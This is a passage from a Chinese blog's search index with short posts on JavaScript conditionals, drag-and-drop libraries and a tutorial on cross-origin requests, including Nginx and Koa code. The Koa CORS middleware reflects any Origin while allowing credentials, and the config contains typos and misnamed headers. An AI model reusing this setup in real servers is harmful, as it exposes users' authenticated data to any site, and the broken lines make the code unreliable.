/>对于逻辑与运算符，其左侧的条件如果为<code>false</code>，就会直接发生短路，不再继续往后执行；如果左侧的条件为<code>true</code>，就会返回其右侧的计算结果。所以，对于这种 <code>if</code>中只有一行表达式的情况，可以使用逻辑与运算符来简化，其中左侧为判断条件，右侧是要执行的逻辑：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(a &lt; <span class="number">0</span> &amp;&amp; b &gt; <span class="number">100</span> &amp;&amp; c === <span class="number">10</span>) &amp;&amp; <span class="title function_">fn</span>();</span><br></pre></td></tr></table></figure><p><br /><strong>参考：</strong><br />1<a href="https://www.digitalocean.com/community/posts/5-tips-to-write-better-conditionals-in-javascript">https://www.digitalocean.com/community/posts/5-tips-to-write-better-conditionals-in-javascript</a><br />2<a href="https://www.geeksforgeeks.org/tips-for-writing-better-conditionals-in-javascript/">https://www.geeksforgeeks.org/tips-for-writing-better-conditionals-in-javascript/</a></p><br /><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
            <tag> 技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拖拽排序库</title>
      <link href="/2022/08/16/frontend/collection/wheel/tuo-zhuai-pai-xu-ku/"/>
      <url>/2022/08/16/frontend/collection/wheel/tuo-zhuai-pai-xu-ku/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="PhFl1"></a></p><h1 id="1-React-Beautiful-Dnd"><a href="#1-React-Beautiful-Dnd" class="headerlink" title="1. React Beautiful Dnd"></a>1. React Beautiful Dnd</h1><p>react-beautiful-dnd 是一款美观且简单易用的 React 列表拖拽库。其动画效果自然，性能优秀，简洁而强大的 API，易于上手，与标准浏览器的互动性非常好。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1658845658074-c11cf3bf-38e6-40be-a4b4-445c8898d079.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1658845658074-c11cf3bf-38e6-40be-a4b4-445c8898d079.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="NpcJr"></a></p><h1 id="2-Sortable"><a href="#2-Sortable" class="headerlink" title="2. Sortable"></a>2. Sortable</h1><p>Sortable 是一个 JavaScript 拖拽库，用于在现代浏览器和触摸设备上对拖放列表进行重新排序。支持 Meteor、AngularJS、React、Polymer、Vue、Ember、Knockout 和任何 CSS 库。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658845354776-d9e504e8-1a16-4a69-b5aa-1d7b458a12be.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658845354776-d9e504e8-1a16-4a69-b5aa-1d7b458a12be.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="SdSue"></a></p><h1 id="3-Dragula"><a href="#3-Dragula" class="headerlink" title="3. Dragula"></a>3. Dragula</h1><p>Dragula 是一个 JavaScript 库，实现了网页上的拖放功能。提供 JavaScript、AngularJS 和 React 版本。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658846116809-5f5ed7f0-2b78-4108-a99c-7f22dc5a6123.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658846116809-5f5ed7f0-2b78-4108-a99c-7f22dc5a6123.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="KMplr"></a></p><h1 id="4-React-DnD"><a href="#4-React-DnD" class="headerlink" title="4. React DnD"></a>4. React DnD</h1><p>React DnD 是 React 和 Redux 核心作者 Dan Abramov 创造的一组 React 高阶组件，可帮助我们构建复杂的拖放界面，同时保持组件解耦。它可以在应用程序的不同部分之间通过拖动传输数据，并且组件会更改其外观和应用状态以响应拖放事件。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658844194608-80d5a46d-2ef5-4f67-9db6-73638e8165a8.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658844194608-80d5a46d-2ef5-4f67-9db6-73638e8165a8.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="cSH6e"></a></p><h1 id="5-Vue-Draggable"><a href="#5-Vue-Draggable" class="headerlink" title="5. Vue.Draggable"></a>5. Vue.Draggable</h1><p>Vue.Draggable 是基于 Sortable.js 的 Vue 拖放组件。它允许拖放和视图模型数组同步，基于并提供 Sortable.js 的所有功能。该库适用于 Vue 2，如果想在 Vue 3 中使用该库，可以访问：<a href="https://github.com/SortableJS/vue.draggable.next">https://github.com/SortableJS/vue.draggable.next</a>。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1658845095630-ba6a45c9-fe9b-45cd-8ccf-ea7618a3f069.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1658845095630-ba6a45c9-fe9b-45cd-8ccf-ea7618a3f069.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="wCevg"></a></p><h1 id="6-interact-js"><a href="#6-interact-js" class="headerlink" title="6. interact.js"></a>6. interact.js</h1><p>interact.js 是一个适用于现代浏览器的 JavaScript 拖放库，支持调整大小和多点触控手势，具有惯性和捕捉功能。为了尽可能多地提供控制，它尝试提供一个简单、灵活的 API，该 API 提供移动元素所需的所有拖拽 API。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658845930134-ecc4b6d9-9195-497c-8a66-a503c4aa8d9f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658845930134-ecc4b6d9-9195-497c-8a66-a503c4aa8d9f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="TwrSp"></a></p><h1 id="7-React-Draggable"><a href="#7-React-Draggable" class="headerlink" title="7. React Draggable"></a>7. React Draggable</h1><p>React-Draggable 库简单易用，将 CSS 中的 transform 应用于 React 组件，允许我们在 UI 中拖动组件。它有不同的 props 可以让你改变组件的行为，是创建直观、用户友好界面的绝佳选择。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1658844929818-c8bf8b77-056d-4830-bb8c-36fcc966a31f.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1658844929818-c8bf8b77-056d-4830-bb8c-36fcc966a31f.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="GSj3v"></a></p><h1 id="8-React-Sortable-Tree"><a href="#8-React-Sortable-Tree" class="headerlink" title="8. React Sortable Tree"></a>8. React Sortable Tree</h1><p>React Sortable Tree 是一个用于对分层数据进行拖放式可排序表示的 React 组件。它支持单选多选，鼠标拖拽子集到新合集，模糊搜索等。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1658846422180-4a092775-e056-4f74-a4cc-4807f0696dc7.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1658846422180-4a092775-e056-4f74-a4cc-4807f0696dc7.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><br /><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 收藏 </tag>
            
            <tag> 拖拽排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨域的产生于解决</title>
      <link href="/2022/08/05/solution/kua-yu-de-chan-sheng-yu-jie-jue/"/>
      <url>/2022/08/05/solution/kua-yu-de-chan-sheng-yu-jie-jue/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="FoJXO"></a></p><h2 id="什么是跨域"><a href="#什么是跨域" class="headerlink" title="什么是跨域"></a>什么是跨域</h2><p><strong>跨域</strong>，是指浏览器不能执行其他网站的脚本。它是由浏览器的同源策略造成的，是浏览器对 JavaScript 实施的安全限制。<br /><strong>同源策略</strong>：是一个重要的安全策略，它用于限制一个 origin 的文档或者它加载的脚本如何能与另一个源的资源进行交互。它能帮助阻隔恶意文档，减少可能被攻击的媒介。所谓的同源，指的是协议、域名、端口相同。浏览器处于安全方面的考虑，只允许本域名下的接口交互，不同源的客户端脚本，在没有明确授权的情况下，不能读写对方的资源。</p><p><a name="ThR4U"></a></p><h3 id="同源策略限制的内容"><a href="#同源策略限制的内容" class="headerlink" title="同源策略限制的内容"></a>同源策略限制的内容</h3><ul><li>Cookie , LocalStorage ,IndexedDB 等存储性内容。</li><li>DOM 节点</li><li>AJAX 请求发送后,非同源会被浏览器拦截。<br />但是有三个标签是允许跨域加载资源:</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">XXX</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">XXX</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">XXX</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a name="Isv8E"></a></p><h3 id="跨域产生的原因"><a href="#跨域产生的原因" class="headerlink" title="跨域产生的原因"></a>跨域产生的原因</h3><p>浏览器遵从同源策略，限制 <code>ajax</code>  跨域的原因在于 <code>ajax</code>  网络请求是可以携带 <code>cookie</code>  的（通过设置 <code>withCredentials</code>  为 <code>true</code> ），比如用户打开了浏览器，登录了 <code>weibo.com</code> ，然后又打开了<code>baidu.com</code>，这时候百度首页内的 <code>js</code> ，向 <code>weibo.com</code>  用 <code>withCredentials</code>  为 <code>true</code>  的 <code>ajax</code>  方式提交一个 <code>post</code>  请求，是会携带浏览器和 <code>weibo.com</code>  之间的 <code>cookie</code>  的，所以浏览器就默认禁止了 <code>ajax</code>  跨域。<br />只有当  <strong>protocol（协议）、domain（域名）、port（端口）三者一致，</strong>才是同源。</p><p><a name="9QSxe"></a></p><h3 id="反向代理和正向代理"><a href="#反向代理和正向代理" class="headerlink" title="反向代理和正向代理"></a>反向代理和正向代理</h3><p><a name="ubDH4"></a></p><h4 id="反向代理-隐藏真实的服务器端"><a href="#反向代理-隐藏真实的服务器端" class="headerlink" title="反向代理:隐藏真实的服务器端"></a>反向代理:隐藏真实的服务器端</h4><p>类似场景：拨打总机号，然后一层层转接到分机<br />真实场景：访问淘宝—》反向代理服务器—》转发到真实的服务器—》返回资源给反向代理服务器—》返回给客户端<br><a name="iSzu3"></a></p><h4 id="正向代理：隐藏真实的客户端"><a href="#正向代理：隐藏真实的客户端" class="headerlink" title="正向代理：隐藏真实的客户端"></a>正向代理：隐藏真实的客户端</h4><p>类似场景：A 问 B 借钱，B 不肯，A 拜托 B 的挚友 C 帮忙，C 问 B 借到了钱，然后把钱给了 A，而 B 并不知道实际是 A 借的钱<br />真实场景：客户端请求访问 facebook.com,无法访问到资源，这时借助代理，代理请求 facebook 的资源，然后发送给客户端，facebook.com 并不知道真正的客户端是谁</p><p><a name="eJ8uM"></a></p><h2 id="跨域的解决方案"><a href="#跨域的解决方案" class="headerlink" title="跨域的解决方案"></a>跨域的解决方案</h2><p><a name="PQI7q"></a></p><h3 id="Nginx-反向代理"><a href="#Nginx-反向代理" class="headerlink" title="Nginx 反向代理"></a>Nginx 反向代理</h3><p><a name="7Qz7u"></a></p><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>Nginx 通过反向代理的方式保证当前域，能获取到静态资源和接口，不关心是怎么获取的。<br /><a href="https://www.yuque.com/snb/efe/yignkl?view=doc_embed">Nginx 从入门到实践</a><br /><a href="https://www.yuque.com/snb/efe/oz2qqg?view=doc_embed">nginx 反向代理和负载均衡策略实战案例</a><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/svg/164572/1591152392946-59e6393b-18d8-410d-8402-3e3d64406a8b.svg" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/svg/164572/1591152392946-59e6393b-18d8-410d-8402-3e3d64406a8b.svg" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="RwELo"></a></p><h4 id="配置-Nginx"><a href="#配置-Nginx" class="headerlink" title="配置 Nginx"></a>配置 Nginx</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">  <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">  <span class="attribute">server_name</span>  www.xxx.com;</span><br><span class="line">  <span class="attribute">index</span> index.html index.htm default.html default.htm;</span><br><span class="line"></span><br><span class="line">  <span class="comment">#ERROR-PAGE-START  错误页配置，可以注释、删除或修改</span></span><br><span class="line"> <span class="comment">#error_page 404 /www/wwwroot/index.html;</span></span><br><span class="line"></span><br><span class="line">  <span class="section">location</span> / &#123;</span><br><span class="line">    <span class="comment">#proxy_pass http://abc.xx.com;</span></span><br><span class="line">    <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    <span class="attribute">root</span> /www/wwwroot/proxy.test;</span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$url</span>/ /index.html = <span class="number">404</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="section">location</span><span class="regexp"> ^~</span> /api/ &#123;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Upgrade <span class="variable">$http_upgrade</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Connection <span class="variable">$connection_upgrade</span>;</span><br><span class="line">    <span class="attribute">proxy_http_version</span> <span class="number">1</span>.<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#持久化连接相关配置</span></span><br><span class="line">    <span class="comment">#proxy_connect_timeout 30s;</span></span><br><span class="line">    <span class="comment">#proxy_read_timeout 86400s;</span></span><br><span class="line">    <span class="comment">#proxy_send_timeout 30s;</span></span><br><span class="line">    <span class="comment">#proxy_http_version 1.1;</span></span><br><span class="line">    <span class="comment">#proxy_set_header Upgrade $http_upgrade;</span></span><br><span class="line">    <span class="comment">#proxy_set_header Connection $connection_upgrade;</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">proxy_pass</span> http://app-api;</span><br><span class="line">    <span class="attribute">proxy_intercepe_errors</span> <span class="literal">on</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="ZSWIQ"></a></p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>前端代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  axios.<span class="property">defaults</span>.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br><span class="line">  getlist.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    axios.<span class="title function_">get</span>(<span class="string">&quot;/api/list&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">data</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">  login.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    axios.<span class="title function_">post</span>(<span class="string">&quot;/api/login&quot;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>后端代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/api/list&quot;</span>, <span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">  ctx.<span class="property">body</span> = &#123;</span><br><span class="line">    <span class="attr">data</span>: [&#123; <span class="attr">name</span>: <span class="string">&quot;test&quot;</span> &#125;]</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/api/login&quot;</span>, <span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">  ctx.<span class="property">cookies</span>.<span class="title function_">set</span>(<span class="string">&quot;token&quot;</span>, token, &#123;</span><br><span class="line">    <span class="attr">expires</span>: <span class="keyword">new</span> <span class="title class_">Date</span>(+<span class="keyword">new</span> <span class="title class_">Date</span>() + <span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>)</span><br><span class="line">  &#125;);</span><br><span class="line">  ctx.<span class="property">body</span> = &#123;</span><br><span class="line">    <span class="attr">msg</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">    <span class="attr">code</span>: <span class="number">0</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="uBkSN"></a></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p><a name="ONXWn"></a></p><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>CORS（cross-origin resource sharing），跨源资源共享（一般俗称『跨域请求』），跨域资源共享(CORS) 是一种机制，它使用额外的 HTTP 头来告诉浏览器 让运行在一个 origin (domain) 上的 Web 应用被准许访问来自不同源服务器上的指定的资源。当一个资源从与该资源本身所在的服务器<strong>「不同的域、协议或端口」</strong>请求一个资源时，资源会发起一个<strong>「跨域 HTTP 请求</strong>。 <br />MDN 上的介绍 (<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)%E3%80%82">https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)。</a><br />而在 cors 中会有 <strong>简单请求</strong> 和 <strong>预检请求（preflighted requests）</strong>的概念。<br /><strong>浏览器支持情况：</strong>当你使用 IE&lt;&#x3D;9, Opera&lt;12, or Firefox&lt;3.5 或者更加老的浏览器，这个时候请使用 JSONP 。</p><p><a name="WQy3Q"></a></p><h4 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h4><p>不会触发 CORS <strong>预检请求</strong>。这样的请求为“<strong>简单请求</strong>”，请注意，该术语并不属于 Fetch （其中定义了 CORS）规范。<br />若请求满足所有下述条件，则该请求可视为“<strong>简单请求</strong>”：</p><ul><li><strong>HTTP 方法</strong>只能是 GET、HEAD 或 POST；</li><li><strong>HTTP 头</strong>只能是 Accept&#x2F;Accept-Language&#x2F;Conent-Language&#x2F;Content-Type&#x2F;DPR&#x2F;Downlink&#x2F;Save-Data&#x2F;Viewport-Width&#x2F;Width；</li><li><strong>Content-Type 头</strong>只能是 text&#x2F;plain、multipart&#x2F;form-data 或 application&#x2F;x-www-form-urlencoded。</li><li>请求中的任意  <code>XMLHttpRequestUpload</code> 对象均没有注册任何事件监听器；<code>XMLHttpRequestUpload</code> 对象可以使用 <code>XMLHttpRequest.upload</code> 属性访问。</li><li>请求中没有使用 <code>ReadableStream</code> 对象。</li></ul><p><a name="Zbdfr"></a></p><h4 id="非简单请求"><a href="#非简单请求" class="headerlink" title="非简单请求"></a>非简单请求</h4><p>除以上情况外的。</p><p>看上去很是复杂。那么怎么理解这些限制呢？<br />其实，<strong>简单请求就是普通 HTML Form 在不依赖脚本的情况下可以发出的请求</strong>，比如表单的 method 如果指定为 POST ，可以用 enctype 属性指定用什么方式对表单内容进行编码，合法的值就是前述这三种。<br /><strong>非简单请求就是普通 HTML Form 无法实现的请求。</strong>比如 PUT 方法、需要其他的内容编码方式、自定义头之类的。</p><p>对于服务器来说，第一，许多服务器压根没打算给跨源用。当然你不给 CORS 响应头，浏览器也不会使用响应结果，但是请求本身可能已经造成了后果。所以最好是默认禁止跨源请求。<br />第二，要回答某个请求是否接受跨源，可能涉及额外的计算逻辑。这个逻辑可能很简单，比如一律放行。也可能比较复杂，结果可能取决于哪个资源哪种操作来自哪个 origin。对浏览器来说，就是某个资源是否允许跨源这么简单；对服务器来说，计算成本却可大可小。所以我们希望最好不用每次请求都让服务器劳神计算。<br />CORS-preflight 就是这样一种机制，浏览器先单独请求一次，询问服务器某个资源是否可以跨源，如果不允许的话就不发实际的请求。注意先许可再请求等于默认禁止了跨源请求。如果允许的话，浏览器会记住，然后发实际请求，且之后每次就都直接请求而不用再询问服务器否可以跨源了。于是，服务器想支持跨源，就只要针对 preflight 进行跨源许可计算。本身真正的响应代码则完全不管这个事情。并且因为 preflight 是许可式的，也就是说如果服务器不打算接受跨源，什么事情都不用做。<br />但是这机制只能限于非简单请求。在处理简单请求的时候，如果服务器不打算接受跨源请求，不能依赖 CORS-preflight 机制。因为不通过 CORS，普通表单也能发起简单请求，所以默认禁止跨源是做不到的。<br />既然如此，简单请求发 preflight 就没有意义了，就算发了服务器也省不了后续每次的计算，反而在一开始多了一次 preflight。<br />有些人把简单请求不需要 preflight 理解为『向下兼容』。这也不能说错。但严格来说，并不是『为了向下兼容』而不能发。理论上浏览器可以区别对待表单请求和非表单请求 —— 对传统的跨源表单提交不发 preflight，从而保持兼容，只对非表单跨源请求发 preflight。<br />但这样做并没有什么好处，反而把事情搞复杂了。比如本来你可以直接用脚本发跨源普通请求，尽管（在服务器默认没有跨源处理的情况下）你无法得到响应结果，但是你的需求可能只是发送无需返回，比如打个日志。但现在如果服务器不理解 preflight 你就干不了这个事情了。<br />而且如果真的这样做，服务器就变成了默认允许跨源表单，如果想控制跨源，还是得（跟原本一样）直接在响应处理中执行跨源计算逻辑；另一方面服务器又需要增加对 preflight 请求的响应支持，执行类似的跨源计算逻辑以控制来自非表单的相同跨源请求。服务器通常没有区分表单&#x2F;非表单差异的需求，这样搞纯粹是折腾服务器端工程师。<br />所以简单请求不发 preflight 不是因为不能兼容，而是因为兼容的前提下发 preflight 对绝大多数服务器应用来说没有意义，反而把问题搞复杂了。</p><p><a name="UdvCE"></a></p><h4 id="Node-中的解决方案"><a href="#Node-中的解决方案" class="headerlink" title="Node 中的解决方案"></a>Node 中的解决方案</h4><p><a name="hIxcn"></a></p><h5 id="原生方式"><a href="#原生方式" class="headerlink" title="原生方式"></a>原生方式</h5><p>我们来看下后端部分的解决方案。<code>Node</code> 中 <code>CORS</code> 的解决代码.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  ctx.<span class="title function_">set</span>(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>, ctx.<span class="property">headers</span>.<span class="property">origin</span>);</span><br><span class="line">  ctx.<span class="title function_">set</span>(<span class="string">&quot;Access-Control-Allow-Credentials&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">  ctx.<span class="title function_">set</span>(<span class="string">&quot;Access-Control-Request-Method&quot;</span>, <span class="string">&quot;PUT,POST,GET,DELETE,OPTIONS&quot;</span>);</span><br><span class="line">  ctx.<span class="title function_">set</span>(</span><br><span class="line">    <span class="string">&quot;Access-Control-Allow-Headers&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin, X-Requested-With, Content-Type, Accept, cc&quot;</span></span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">if</span> (ctx.<span class="property">method</span> === <span class="string">&quot;OPTIONS&quot;</span>) &#123;</span><br><span class="line">    ctx.<span class="property">status</span> = <span class="number">204</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">next</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="97yOf"></a></p><h5 id="第三方中间件"><a href="#第三方中间件" class="headerlink" title="第三方中间件"></a>第三方中间件</h5><p>为了方便也可以直接使用中间件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&quot;koa-cors&quot;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cors</span>());</span><br></pre></td></tr></table></figure><p><a name="U4oIw"></a></p><h5 id="关于-cors-的-cookie-问题"><a href="#关于-cors-的-cookie-问题" class="headerlink" title="关于 cors 的 cookie 问题"></a>关于 cors 的 cookie 问题</h5><p>想要传递 <code>cookie</code> 需要满足 3 个条件<br />1.web 请求设置<code>withCredentials</code><br />这里默认情况下在跨域请求，浏览器是不带 cookie 的。但是我们可以通过设置 <code>withCredentials</code> 来进行传递 <code>cookie</code>.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span 